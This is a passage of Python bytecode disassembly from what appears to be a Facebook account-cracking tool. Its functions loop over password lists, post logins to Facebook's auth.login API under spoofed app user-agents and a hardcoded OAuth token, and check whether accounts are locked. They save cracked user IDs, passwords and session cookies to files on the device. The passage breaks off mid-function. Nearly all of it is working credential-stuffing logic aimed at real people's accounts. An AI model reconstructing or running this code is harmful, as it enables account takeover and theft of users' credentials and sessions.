           1814 LOAD_CONST              56 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK ID ')
           1816 LOAD_GLOBAL             31 (NULL + str)
           1828 LOAD_GLOBAL             33 (NULL + len)
           1840 LOAD_GLOBAL             46 (oks)
           1852 PRECALL                  1
           1856 CALL                     1
           1866 PRECALL                  1
           1870 CALL                     1
           1880 BINARY_OP                0 (+)
           1884 PRECALL                  1
           1888 CALL                     1
           1898 POP_TOP

121        1900 LOAD_GLOBAL              5 (NULL + print)
           1912 LOAD_CONST              57 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP ID ')
           1914 LOAD_GLOBAL             31 (NULL + str)
           1926 LOAD_GLOBAL             33 (NULL + len)
           1938 LOAD_GLOBAL             48 (cps)
           1950 PRECALL                  1
           1954 CALL                     1
           1964 PRECALL                  1
           1968 CALL                     1
           1978 BINARY_OP                0 (+)
           1982 PRECALL                  1
           1986 CALL                     1
           1996 POP_TOP

122        1998 LOAD_GLOBAL              9 (NULL + input)
           2010 LOAD_CONST              58 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46m PRESS ENTER TO BACK  : ')
           2012 PRECALL                  1
           2016 CALL                     1
           2026 POP_TOP

123        2028 LOAD_GLOBAL              7 (NULL + linex2)
           2040 PRECALL                  0
           2044 CALL                     0
           2054 POP_TOP

124        2056 LOAD_GLOBAL             51 (NULL + MAHI_ISLAM)
           2068 PRECALL                  0
           2072 CALL                     0
           2082 POP_TOP
           2084 LOAD_CONST               0 (None)
           2086 RETURN_VALUE
ExceptionTable:
  692 to 746 -> 750 [0]
  750 to 772 -> 780 [1] lasti
  778 to 778 -> 780 [1] lasti
  1012 to 1694 -> 1722 [1] lasti
  1722 to 1728 -> 1730 [3] lasti
  1736 to 1736 -> 1730 [3] lasti

Disassembly of <code object <genexpr> at 0x7ecf71443440, file " ", line 95>:
 95           0 RETURN_GENERATOR
              2 POP_TOP
              4 RESUME                   0
              6 LOAD_FAST                0 (.0)
        >>    8 FOR_ITER                34 (to 78)
             10 STORE_FAST               1 (_)
             12 LOAD_GLOBAL              1 (NULL + random)
             24 LOAD_ATTR                1 (choice)
             34 LOAD_GLOBAL              4 (string)
             46 LOAD_ATTR                3 (digits)
             56 PRECALL                  1
             60 CALL                     1
             70 YIELD_VALUE
             72 RESUME                   1
             74 POP_TOP
             76 JUMP_BACKWARD           35 (to 8)
        >>   78 LOAD_CONST               0 (None)
             80 RETURN_VALUE

Disassembly of <code object hasan01 at 0x7ecf714c5a30, file " ", line 127>:
127           0 RESUME                   0

128           2 LOAD_CONST               1 ("[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';FBDM/{density='+random.choice(str(['1.0','1.5','2.0','2.5','3.0']))+',width=720,height=1280};FBLC/en_US;FBRV/'+str(random.randint(1111111,9999999))+';FBCR/KYIVSTAR;FBMF/Pixel;FBBD/Pixel;FBPN/'+str(random.choice(['com.facebook.lite','com.facebook.adsmanager','com.facebook.katana','com.facebook.mlite']))+';FBDV/Pixel 5;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]")
              4 STORE_FAST               0 (ua)

129           6 LOAD_FAST                0 (ua)
              8 RETURN_VALUE

Disassembly of <code object hasan02 at 0x7ecf714c5ca0, file " ", line 131>:
131           0 RESUME                   0

132           2 LOAD_CONST               1 ("[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';FBDM/{density='+random.choice(str(['1.0','1.5','2.0','2.5','3.0']))+',width=720,height=1280};FBLC/en_US;FBRV/'+str(random.randint(1111111,9999999))+';FBCR/Zong;FBMF/Samsung;FBBD/Samsung;FBPN/'+str(random.choice(['com.facebook.lite','com.facebook.adsmanager','com.facebook.katana','com.facebook.mlite']))+';FBDV/SM-G975U;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]")
              4 STORE_FAST               0 (ua)

133           6 LOAD_FAST                0 (ua)
              8 RETURN_VALUE

Disassembly of <code object hasan03 at 0x7ecf714c6250, file " ", line 135>:
135           0 RESUME                   0

136           2 LOAD_CONST               1 ("[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';FBDM/{density='+random.choice(str(['1.0','1.5','2.0','2.5','3.0']))+',width=720,height=1280};FBLC/en_US;FBRV/'+str(random.randint(1111111,9999999))+';FBCR/Zong;FBMF/iPhone;FBBD/iPhone;FBPN/'+str(random.choice(['com.facebook.lite','com.facebook.adsmanager','com.facebook.katana','com.facebook.mlite']))+';FBDV/iPhone OS 15;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]")
              4 STORE_FAST               0 (ua)

137           6 LOAD_FAST                0 (ua)
              8 RETURN_VALUE

Disassembly of <code object VENOM_UA at 0x7ecf71057780, file " ", line 138>:
138           0 RESUME                   0

139           2 LOAD_GLOBAL              1 (NULL + random)
             14 LOAD_ATTR                1 (choice)
             24 BUILD_LIST               0
             26 LOAD_CONST               1 (('en_US', 'en_GB', 'en_PK', 'ru_RU', 'de_DE', 'en_BD', 'en_IN', 'en_AF'))
             28 LIST_EXTEND              1
             30 PRECALL                  1
             34 CALL                     1
             44 STORE_FAST               0 (en)

140          46 LOAD_CONST               2 ("random.choice(['o2 - de', 'Verizon - us', 'Vodafone - uk','null','en_GB','en_US','en_PK','IND airtel','Nepal Telecom'])}")
             48 STORE_FAST               1 (fbcr)

141          50 LOAD_CONST               3 ('[FBAN/FB4A;FBAV/')
             52 LOAD_GLOBAL              5 (NULL + str)
             64 LOAD_GLOBAL              1 (NULL + random)
             76 LOAD_ATTR                3 (randint)
             86 LOAD_CONST               4 (111)
             88 LOAD_CONST               5 (999)
             90 PRECALL                  2
             94 CALL                     2
            104 PRECALL                  1
            108 CALL                     1
            118 BINARY_OP                0 (+)
            122 LOAD_CONST               6 ('.0.0.')
            124 BINARY_OP                0 (+)
            128 LOAD_GLOBAL              5 (NULL + str)
            140 LOAD_GLOBAL              1 (NULL + random)
            152 LOAD_ATTR                4 (randrange)
            162 LOAD_CONST               7 (9)
            164 LOAD_CONST               8 (99)
            166 PRECALL                  2
            170 CALL                     2
            180 PRECALL                  1
            184 CALL                     1
            194 BINARY_OP                0 (+)
            198 LOAD_GLOBAL              5 (NULL + str)
            210 LOAD_GLOBAL              1 (NULL + random)
            222 LOAD_ATTR                3 (randint)
            232 LOAD_CONST               4 (111)
            234 LOAD_CONST               5 (999)
            236 PRECALL                  2
            240 CALL                     2
            250 PRECALL                  1
            254 CALL                     1
            264 BINARY_OP                0 (+)
            268 LOAD_CONST               9 (';FBBV/')
            270 BINARY_OP                0 (+)
            274 LOAD_GLOBAL              5 (NULL + str)
            286 LOAD_GLOBAL              1 (NULL + random)
            298 LOAD_ATTR                3 (randint)
            308 LOAD_CONST              10 (111111111)
            310 LOAD_CONST              11 (999999999)
            312 PRECALL                  2
            316 CALL                     2
            326 PRECALL                  1
            330 CALL                     1
            340 BINARY_OP                0 (+)
            344 STORE_FAST               2 (s)

142         346 LOAD_CONST              12 (';[FBAN/FB4A;FBAV/402.1.0.24.84;FBBV/447581060;FBDM/{density=2.5,width=1440,height=2106};FBLC/')
            348 LOAD_FAST                0 (en)
            350 BINARY_OP                0 (+)
            354 LOAD_CONST              13 (';FBRV/0;FBCR/Bell;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S908W;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]')
            356 BINARY_OP                0 (+)
            360 STORE_FAST               3 (e)

143         362 LOAD_FAST                2 (s)
            364 LOAD_FAST                3 (e)
            366 BINARY_OP                0 (+)
            370 STORE_FAST               4 (ua)

145         372 LOAD_FAST                4 (ua)
            374 RETURN_VALUE

Disassembly of <code object HASAN_UA at 0x7ecf714c63f0, file " ", line 147>:
147           0 RESUME                   0

148           2 LOAD_CONST               1 ('[FBAN/FB4A;FBAV/70.0.0.3739;FBBV/5533200;[FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/hr_BA;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]')
              4 STORE_FAST               0 (ua)

149           6 LOAD_FAST                0 (ua)
              8 RETURN_VALUE

Disassembly of <code object method_crack at 0x7ecf7101d400, file " ", line 150>:
150           0 RESUME                   0

154           2 NOP

155           4 LOAD_FAST                1 (passlist)
              6 GET_ITER
        >>    8 EXTENDED_ARG             2
             10 FOR_ITER               602 (to 1216)
             12 STORE_FAST               2 (pas)

156          14 LOAD_GLOBAL              0 (sys)
             26 LOAD_ATTR                1 (stdout)
             36 LOAD_METHOD              2 (write)
             58 LOAD_CONST               1 ('\r\r \x1b[38;5;196m[\x1b[38;5;46mCRACKING-M1\x1b[38;5;196m] \x1b[38;5;46m')
             60 LOAD_GLOBAL              6 (loop)
             72 FORMAT_VALUE             1 (str)
             74 LOAD_CONST               2 (' \x1b[38;5;196m| \x1b[38;5;46mOK \x1b[38;5;196m:\x1b[38;5;46m')
             76 LOAD_GLOBAL              9 (NULL + len)
             88 LOAD_GLOBAL             10 (oks)
            100 PRECALL                  1
            104 CALL                     1
            114 FORMAT_VALUE             1 (str)
            116 BUILD_STRING             4
            118 PRECALL                  1
            122 CALL                     1
            132 POP_TOP

157         134 LOAD_GLOBAL              0 (sys)
            146 LOAD_ATTR                1 (stdout)
            156 LOAD_METHOD              6 (flush)
            178 PRECALL                  0
            182 CALL                     0
            192 POP_TOP

158         194 LOAD_GLOBAL             15 (NULL + str)
            206 LOAD_GLOBAL             17 (NULL + uuid)
            218 LOAD_ATTR                9 (uuid4)
            228 PRECALL                  0
            232 CALL                     0
            242 PRECALL                  1
            246 CALL                     1
            256 STORE_FAST               3 (adid)

159         258 LOAD_GLOBAL             15 (NULL + str)
            270 LOAD_GLOBAL             17 (NULL + uuid)
            282 LOAD_ATTR                9 (uuid4)
            292 PRECALL                  0
            296 CALL                     0
            306 PRECALL                  1
            310 CALL                     1
            320 STORE_FAST               4 (device_id)

160         322 LOAD_FAST                3 (adid)
            324 LOAD_CONST               3 ('json')
            326 LOAD_FAST                4 (device_id)
            328 LOAD_FAST                0 (ids)
            330 LOAD_FAST                2 (pas)
            332 LOAD_CONST               4 ('1')
            334 LOAD_CONST               5 ('password')
            336 LOAD_CONST               6 ('login')
            338 LOAD_CONST               7 ('button_with_disabled')
            340 LOAD_CONST               8 ('false')
            342 LOAD_CONST               4 ('1')
            344 LOAD_CONST               4 ('1')
            346 LOAD_CONST               9 ('')
            348 LOAD_CONST              10 ('0')
            350 LOAD_CONST              11 ('authenticate')
            352 LOAD_CONST              12 (('adid', 'format', 'device_id', 'email', 'password', 'generate_analytics_claims', 'credentials_type', 'source', 'error_detail_type', 'enroll_misauth', 'generate_session_cookies', 'generate_machine_id', 'meta_inf_fbmeta', 'currently_logged_in_userid', 'fb_api_req_friendly_name'))
            354 BUILD_CONST_KEY_MAP     15
            356 STORE_FAST               5 (datax)

161         358 LOAD_GLOBAL             21 (NULL + hasan01)
            370 PRECALL                  0
            374 CALL                     0
            384 LOAD_CONST              13 ('gzip, deflate')
            386 LOAD_CONST              14 ('*/*')
            388 LOAD_CONST              15 ('keep-alive')
            390 LOAD_CONST              16 ('OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32')
            392 LOAD_CONST              11 ('authenticate')
            394 LOAD_CONST              17 ('21435')
            396 LOAD_CONST              18 ('35793')
            398 LOAD_CONST              19 ('37855')
            400 LOAD_CONST              20 ('unknown')
            402 LOAD_CONST              21 ('application/x-www-form-urlencoded')
            404 LOAD_CONST              22 ('Liger')
            406 LOAD_CONST              23 (('User-Agent', 'Accept-Encoding', 'Accept', 'Connection', 'Authorization', 'X-FB-Friendly-Name', 'X-FB-Connection-Bandwidth', 'X-FB-Net-HNI', 'X-FB-SIM-HNI', 'X-FB-Connection-Type', 'Content-Type', 'X-FB-HTTP-Engine'))
            408 BUILD_CONST_KEY_MAP     12
            410 STORE_FAST               6 (header)

162         412 LOAD_CONST              24 ('https://api.facebook.com/method/auth.login')
            414 STORE_FAST               7 (url)

163         416 LOAD_GLOBAL             23 (NULL + requests)
            428 LOAD_ATTR               12 (post)
            438 LOAD_FAST                7 (url)
            440 LOAD_FAST                5 (datax)
            442 LOAD_FAST                6 (header)
            444 KW_NAMES                25
            446 PRECALL                  3
            450 CALL                     3
            460 LOAD_METHOD             13 (json)
            482 PRECALL                  0
            486 CALL                     0
            496 STORE_FAST               8 (reqx)

164         498 LOAD_CONST              26 ('session_key')
            500 LOAD_FAST                8 (reqx)
            502 CONTAINS_OP              0
            504 POP_JUMP_FORWARD_IF_FALSE   218 (to 942)

165         506 NOP

166         508 LOAD_FAST                8 (reqx)
            510 LOAD_CONST              27 ('uid')
            512 BINARY_SUBSCR
            522 STORE_FAST               9 (uid)
            524 JUMP_FORWARD             9 (to 544)
        >>  526 PUSH_EXC_INFO

167         528 POP_TOP

168         530 LOAD_FAST                0 (ids)
            532 STORE_FAST               9 (uid)
            534 POP_EXCEPT
            536 JUMP_FORWARD             3 (to 544)
        >>  538 COPY                     3
            540 POP_EXCEPT
            542 RERAISE                  1

169     >>  544 LOAD_GLOBAL             29 (NULL + lock_check)
            556 LOAD_FAST                9 (uid)
            558 PRECALL                  1
            562 CALL                     1
            572 STORE_FAST              10 (ckkx)

170         574 LOAD_FAST               10 (ckkx)
            576 LOAD_CONST              28 ('LOCK')
            578 COMPARE_OP               2 (==)
            584 POP_JUMP_FORWARD_IF_FALSE     3 (to 592)

171         586 POP_TOP
            588 EXTENDED_ARG             1
            590 JUMP_FORWARD           312 (to 1216)

173     >>  592 LOAD_GLOBAL             31 (NULL + print)
            604 LOAD_CONST              29 ('\r\r \x1b[38;5;46m[HASAN-OK] ')
            606 LOAD_GLOBAL             15 (NULL + str)
            618 LOAD_FAST                9 (uid)
            620 PRECALL                  1
            624 CALL                     1
            634 BINARY_OP                0 (+)
            638 LOAD_CONST              30 (' | ')
            640 BINARY_OP                0 (+)
            644 LOAD_FAST                2 (pas)
            646 BINARY_OP                0 (+)
            650 LOAD_CONST              31 ('\x1b[1;37m')
            652 BINARY_OP                0 (+)
            656 PRECALL                  1
            660 CALL                     1
            670 POP_TOP

174         672 LOAD_CONST              32 (';')
            674 LOAD_METHOD             16 (join)
            696 LOAD_CONST              33 (<code object <genexpr> at 0x7ecf71402b30, file " ", line 174>)
            698 MAKE_FUNCTION            0
            700 LOAD_FAST                8 (reqx)
            702 LOAD_CONST              34 ('session_cookies')
            704 BINARY_SUBSCR
            714 GET_ITER
            716 PRECALL                  0
            720 CALL                     0
            730 PRECALL                  1
            734 CALL                     1
            744 STORE_FAST              11 (coki)

176         746 LOAD_GLOBAL             35 (NULL + open)
            758 LOAD_CONST              35 ('/sdcard/V2-M1-OK.txt')
            760 LOAD_CONST              36 ('a')
            762 PRECALL                  2
            766 CALL                     2
            776 LOAD_METHOD              2 (write)
            798 LOAD_GLOBAL             15 (NULL + str)
            810 LOAD_FAST                9 (uid)
            812 PRECALL                  1
            816 CALL                     1
            826 LOAD_CONST              30 (' | ')
            828 BINARY_OP                0 (+)
            832 LOAD_FAST                2 (pas)
            834 BINARY_OP                0 (+)
            838 LOAD_CONST              37 ('\n')
            840 BINARY_OP                0 (+)
            844 PRECALL                  1
            848 CALL                     1
            858 POP_TOP

177         860 LOAD_GLOBAL             10 (oks)
            872 LOAD_METHOD             18 (append)
            894 LOAD_GLOBAL             15 (NULL + str)
            906 LOAD_FAST                9 (uid)
            908 PRECALL                  1
            912 CALL                     1
            922 PRECALL                  1
            926 CALL                     1
            936 POP_TOP

178         938 POP_TOP
            940 JUMP_FORWARD           137 (to 1216)

179     >>  942 LOAD_CONST              38 ('www.facebook.com')
            944 LOAD_FAST                8 (reqx)
            946 LOAD_CONST              39 ('error_msg')
            948 BINARY_SUBSCR
            958 CONTAINS_OP              0
            960 POP_JUMP_FORWARD_IF_FALSE   125 (to 1212)

180         962 LOAD_GLOBAL             31 (NULL + print)
            974 LOAD_CONST              40 ('\r\r \x1b[38;5;196m [SORRY-CP] ')
            976 LOAD_GLOBAL             15 (NULL + str)
            988 LOAD_FAST                9 (uid)
            990 PRECALL                  1
            994 CALL                     1
           1004 BINARY_OP                0 (+)
           1008 LOAD_CONST              30 (' | ')
           1010 BINARY_OP                0 (+)
           1014 LOAD_FAST                2 (pas)
           1016 BINARY_OP                0 (+)
           1020 LOAD_CONST              31 ('\x1b[1;37m')
           1022 BINARY_OP                0 (+)
           1026 PRECALL                  1
           1030 CALL                     1
           1040 POP_TOP

181        1042 LOAD_GLOBAL             35 (NULL + open)
           1054 LOAD_CONST              41 ('/sdcard/hasan-CP.txt')
           1056 LOAD_CONST              36 ('a')
           1058 PRECALL                  2
           1062 CALL                     2
           1072 LOAD_METHOD              2 (write)
           1094 LOAD_FAST                0 (ids)
           1096 LOAD_CONST              42 ('|')
           1098 BINARY_OP                0 (+)
           1102 LOAD_FAST                2 (pas)
           1104 BINARY_OP                0 (+)
           1108 LOAD_CONST              37 ('\n')
           1110 BINARY_OP                0 (+)
           1114 PRECALL                  1
           1118 CALL                     1
           1128 POP_TOP

182        1130 LOAD_GLOBAL             38 (cps)
           1142 LOAD_METHOD             18 (append)
           1164 LOAD_GLOBAL             15 (NULL + str)
           1176 LOAD_FAST                9 (uid)
           1178 PRECALL                  1
           1182 CALL                     1
           1192 PRECALL                  1
           1196 CALL                     1
           1206 POP_TOP

183        1208 POP_TOP
           1210 JUMP_FORWARD             2 (to 1216)

185     >> 1212 EXTENDED_ARG             2
           1214 JUMP_BACKWARD          604 (to 8)

186     >> 1216 LOAD_GLOBAL              6 (loop)
           1228 LOAD_CONST              43 (1)
           1230 BINARY_OP               13 (+=)
           1234 STORE_GLOBAL             3 (loop)
           1236 LOAD_CONST               0 (None)
           1238 RETURN_VALUE
        >> 1240 PUSH_EXC_INFO

187        1242 POP_TOP

188        1244 POP_EXCEPT
           1246 LOAD_CONST               0 (None)
           1248 RETURN_VALUE
        >> 1250 COPY                     3
           1252 POP_EXCEPT
           1254 RERAISE                  1
ExceptionTable:
  4 to 504 -> 1240 [0]
  508 to 522 -> 526 [1]
  524 to 524 -> 1240 [0]
  526 to 532 -> 538 [2] lasti
  534 to 1234 -> 1240 [0]
  1240 to 1242 -> 1250 [1] lasti

Disassembly of <code object <genexpr> at 0x7ecf71402b30, file " ", line 174>:
174           0 RETURN_GENERATOR
              2 POP_TOP
              4 RESUME                   0
              6 LOAD_FAST                0 (.0)
        >>    8 FOR_ITER                24 (to 58)
             10 STORE_FAST               1 (i)
             12 LOAD_FAST                1 (i)
             14 LOAD_CONST               0 ('name')
             16 BINARY_SUBSCR
             26 LOAD_CONST               1 ('=')
             28 BINARY_OP                0 (+)
             32 LOAD_FAST                1 (i)
             34 LOAD_CONST               2 ('value')
             36 BINARY_SUBSCR
             46 BINARY_OP                0 (+)
             50 YIELD_VALUE
             52 RESUME                   1
             54 POP_TOP
             56 JUMP_BACKWARD           25 (to 8)
        >>   58 LOAD_CONST               3 (None)
             60 RETURN_VALUE

Disassembly of <code object lock_check at 0x7ecf712f9f70, file " ", line 189>:
189           0 RESUME                   0

190           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (Session)
             24 PRECALL                  0
             28 CALL                     0
             38 STORE_FAST               1 (sessionx)

191          40 LOAD_CONST               1 ('https://www.facebook.com/p/')
             42 LOAD_FAST                0 (uid)
             44 FORMAT_VALUE             0
             46 BUILD_STRING             2
             48 STORE_FAST               2 (urlx)

192          50 LOAD_GLOBAL              5 (NULL + bxx)
             62 LOAD_FAST                1 (sessionx)
             64 LOAD_METHOD              3 (get)
             86 LOAD_FAST                2 (urlx)
             88 PRECALL                  1
             92 CALL                     1
            102 LOAD_ATTR                4 (content)
            112 LOAD_CONST               2 ('html.parser')
            114 PRECALL                  2
            118 CALL                     2
            128 STORE_FAST               3 (req)

193         130 LOAD_FAST                3 (req)
            132 LOAD_METHOD              5 (find)
            154 LOAD_CONST               3 ('title')
            156 PRECALL                  1
            160 CALL                     1
            170 LOAD_ATTR                6 (text)
            180 STORE_FAST               4 (tx)

194         182 LOAD_FAST                4 (tx)
            184 LOAD_CONST               4 ('Facebook')
            186 COMPARE_OP               2 (==)
            192 POP_JUMP_FORWARD_IF_FALSE     2 (to 198)

195         194 LOAD_CONST               5 ('LOCK')
            196 RETURN_VALUE

197     >>  198 LOAD_CONST               6 ('LIVE')
            200 RETURN_VALUE

Disassembly of <code object asraful at 0x7ecf7104e000, file " ", line 200>:
200           0 RESUME                   0

204           2 NOP

205           4 LOAD_FAST                1 (passlist)
              6 GET_ITER
        >>    8 EXTENDED_ARG             2
             10 FOR_ITER               621 (to 1254)
             12 STORE_FAST               2 (pas)

206          14 LOAD_GLOBAL              0 (sys)
             26 LOAD_ATTR                1 (stdout)
             36 LOAD_METHOD              2 (write)
             58 LOAD_CONST               1 ('\r\r \x1b[38;5;196m[\x1b[38;5;46mCRACKING-M2\x1b[38;5;196m] \x1b[38;5;46m')
             60 LOAD_GLOBAL              6 (loop)
             72 FORMAT_VALUE             1 (str)
             74 LOAD_CONST               2 (' \x1b[38;5;196m| \x1b[38;5;46mOK \x1b[38;5;196m:\x1b[38;5;46m')
             76 LOAD_GLOBAL              9 (NULL + len)
             88 LOAD_GLOBAL             10 (oks)
            100 PRECALL                  1
            104 CALL                     1
            114 FORMAT_VALUE             1 (str)
            116 BUILD_STRING             4
            118 PRECALL                  1
            122 CALL                     1
            132 POP_TOP

207         134 LOAD_GLOBAL              0 (sys)
            146 LOAD_ATTR                1 (stdout)
            156 LOAD_METHOD              6 (flush)
            178 PRECALL                  0
            182 CALL                     0
            192 POP_TOP

208         194 LOAD_GLOBAL             15 (NULL + str)
            206 LOAD_GLOBAL             17 (NULL + uuid)
            218 LOAD_ATTR                9 (uuid4)
            228 PRECALL                  0
            232 CALL                     0
            242 PRECALL                  1
            246 CALL                     1
            256 STORE_FAST               3 (adid)

209         258 LOAD_GLOBAL             15 (NULL + str)
            270 LOAD_GLOBAL             17 (NULL + uuid)
            282 LOAD_ATTR                9 (uuid4)
            292 PRECALL                  0
            296 CALL                     0
            306 PRECALL                  1
            310 CALL                     1
            320 STORE_FAST               4 (device_id)

210         322 LOAD_FAST                3 (adid)
            324 LOAD_CONST               3 ('json')
            326 LOAD_FAST                4 (device_id)
            328 LOAD_FAST                0 (ids)
            330 LOAD_FAST                2 (pas)
            332 LOAD_CONST               4 ('1')
            334 LOAD_CONST               5 ('password')
            336 LOAD_CONST               6 ('login')
            338 LOAD_CONST               7 ('button_with_disabled')
            340 LOAD_CONST               8 ('false')
            342 LOAD_CONST               4 ('1')
            344 LOAD_CONST               4 ('1')
            346 LOAD_CONST               9 ('')
            348 LOAD_CONST              10 ('0')
            350 LOAD_CONST              11 ('authenticate')
            352 LOAD_CONST              12 (('adid', 'format', 'device_id', 'email', 'password', 'generate_analytics_claims', 'credentials_type', 'source', 'error_detail_type', 'enroll_misauth', 'generate_session_cookies', 'generate_machine_id', 'meta_inf_fbmeta', 'currently_logged_in_userid', 'fb_api_req_friendly_name'))
            354 BUILD_CONST_KEY_MAP     15
            356 STORE_FAST               5 (datax)

211         358 LOAD_GLOBAL             21 (NULL + hasan02)
            370 PRECALL                  0
            374 CALL                     0
            384 LOAD_CONST              13 ('gzip, deflate')
            386 LOAD_CONST              14 ('*/*')
            388 LOAD_CONST              15 ('keep-alive')
            390 LOAD_CONST              16 ('OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32')
            392 LOAD_CONST              11 ('authenticate')
            394 LOAD_CONST              17 ('21435')
            396 LOAD_CONST              18 ('35793')
            398 LOAD_CONST              19 ('37855')
            400 LOAD_CONST              20 ('unknown')
            402 LOAD_CONST              21 ('application/x-www-form-urlencoded')
            404 LOAD_CONST              22 ('Liger')
            406 LOAD_CONST              23 (('User-Agent', 'Accept-Encoding', 'Accept', 'Connection', 'Authorization', 'X-FB-Friendly-Name', 'X-FB-Connection-Bandwidth', 'X-FB-Net-HNI', 'X-FB-SIM-HNI', 'X-FB-Connection-Type', 'Content-Type', 'X-FB-HTTP-Engine'))
            408 BUILD_CONST_KEY_MAP     12
            410 STORE_FAST               6 (header)

212         412 LOAD_CONST              24 ('https://api.facebook.com/method/auth.login')
            414 STORE_FAST               7 (url)

213         416 LOAD_GLOBAL             23 (NULL + requests)
            428 LOAD_ATTR               12 (post)
            438 LOAD_FAST                7 (url)
            440 LOAD_FAST                5 (datax)
            442 LOAD_FAST                6 (header)
            444 KW_NAMES                25
            446 PRECALL                  3
            450 CALL                     3
            460 LOAD_METHOD             13 (json)
            482 PRECALL                  0
            486 CALL                     0
            496 STORE_FAST               8 (reqx)

214         498 LOAD_CONST              26 ('session_key')
            500 LOAD_FAST                8 (reqx)
            502 CONTAINS_OP              0
            504 POP_JUMP_FORWARD_IF_FALSE   237 (to 980)

215         506 NOP

216         508 LOAD_FAST                8 (reqx)
            510 LOAD_CONST              27 ('uid')
            512 BINARY_SUBSCR
            522 STORE_FAST               9 (uid)
            524 JUMP_FORWARD             9 (to 544)
        >>  526 PUSH_EXC_INFO

217         528 POP_TOP

218         530 LOAD_FAST                0 (ids)
            532 STORE_FAST               9 (uid)
            534 POP_EXCEPT
            536 JUMP_FORWARD             3 (to 544)
        >>  538 COPY                     3
            540 POP_EXCEPT
            542 RERAISE                  1

219     >>  544 LOAD_GLOBAL             15 (NULL + str)
            556 LOAD_FAST                9 (uid)
            558 PRECALL                  1
            562 CALL                     1
            572 LOAD_GLOBAL             10 (oks)
            584 CONTAINS_OP              0
            586 POP_JUMP_FORWARD_IF_FALSE     3 (to 594)

220         588 POP_TOP
            590 EXTENDED_ARG             1
            592 JUMP_FORWARD           330 (to 1254)

222     >>  594 LOAD_GLOBAL             29 (NULL + print)
            606 LOAD_CONST              28 ('\r\r \x1b[38;5;46m[HASAN-OK] ')
            608 LOAD_GLOBAL             15 (NULL + str)
            620 LOAD_FAST                9 (uid)
            622 PRECALL                  1
            626 CALL                     1
            636 BINARY_OP                0 (+)
            640 LOAD_CONST              29 (' | ')
            642 BINARY_OP                0 (+)
            646 LOAD_FAST                2 (pas)
            648 BINARY_OP                0 (+)
            652 LOAD_CONST              30 ('\x1b[1;37m')
            654 BINARY_OP                0 (+)
            658 PRECALL                  1
            662 CALL                     1
            672 POP_TOP

223         674 LOAD_CONST              31 (';')
            676 LOAD_METHOD             15 (join)
            698 LOAD_CONST              32 (<code object <genexpr> at 0x7ecf71402430, file " ", line 223>)
            700 MAKE_FUNCTION            0
            702 LOAD_FAST                8 (reqx)
            704 LOAD_CONST              33 ('session_cookies')
            706 BINARY_SUBSCR
            716 GET_ITER
            718 PRECALL                  0
            722 CALL                     0
            732 PRECALL                  1
            736 CALL                     1
            746 STORE_FAST              10 (coki)

224         748 LOAD_GLOBAL             29 (NULL + print)
            760 LOAD_CONST              34 ('\x1b[38;5;196m [=]-\x1b[38;5;192m[COOKIES] ')
            762 LOAD_FAST               10 (coki)
            764 BINARY_OP                0 (+)
            768 PRECALL                  1
            772 CALL                     1
            782 POP_TOP

225         784 LOAD_GLOBAL             33 (NULL + open)
            796 LOAD_CONST              35 ('/sdcard/V2-M2-OK.txt')
            798 LOAD_CONST              36 ('a')
            800 PRECALL                  2
            804 CALL                     2
            814 LOAD_METHOD              2 (write)
            836 LOAD_GLOBAL             15 (NULL + str)
            848 LOAD_FAST                9 (uid)
            850 PRECALL                  1
            854 CALL                     1
            864 LOAD_CONST              29 (' | ')
            866 BINARY_OP                0 (+)
            870 LOAD_FAST                2 (pas)
            872 BINARY_OP                0 (+)
            876 LOAD_CONST              37 ('\n')
            878 BINARY_OP                0 (+)
            882 PRECALL                  1
            886 CALL                     1
            896 POP_TOP

226         898 LOAD_GLOBAL             10 (oks)
            910 LOAD_METHOD             17 (append)
            932 LOAD_GLOBAL             15 (NULL + str)
            944 LOAD_FAST                9 (uid)
            946 PRECALL                  1
            950 CALL                     1
            960 PRECALL                  1
            964 CALL                     1
            974 POP_TOP

227         976 POP_TOP
            978 JUMP_FORWARD           137 (to 1254)

228     >>  980 LOAD_CONST              38 ('www.facebook.com')
            982 LOAD_FAST                8 (reqx)
            984 LOAD_CONST              39 ('error_msg')
            986 BINARY_SUBSCR
            996 CONTAINS_OP              0
            998 POP_JUMP_FORWARD_IF_FALSE   125 (to 1250)

229        1000 LOAD_GLOBAL             29 (NULL + print)
           1012 LOAD_CONST              40 ('\r\r \x1b[38;5;196m [SORRY-CP] ')
           1014 LOAD_GLOBAL             15 (NULL + str)
           1026 LOAD_FAST                9 (uid)
           1028 PRECALL                  1
           1032 CALL                     1
           1042 BINARY_OP                0 (+)
           1046 LOAD_CONST              29 (' | ')
           1048 BINARY_OP                0 (+)
           1052 LOAD_FAST                2 (pas)
           1054 BINARY_OP                0 (+)
           1058 LOAD_CONST              30 ('\x1b[1;37m')
           1060 BINARY_OP                0 (+)
           1064 PRECALL                  1
           1068 CALL                     1
           1078 POP_TOP

230        1080 LOAD_GLOBAL             33 (NULL + open)
           1092 LOAD_CONST              41 ('/sdcard/hasan-CP.txt')
           1094 LOAD_CONST              36 ('a')
           1096 PRECALL                  2
           1100 CALL                     2
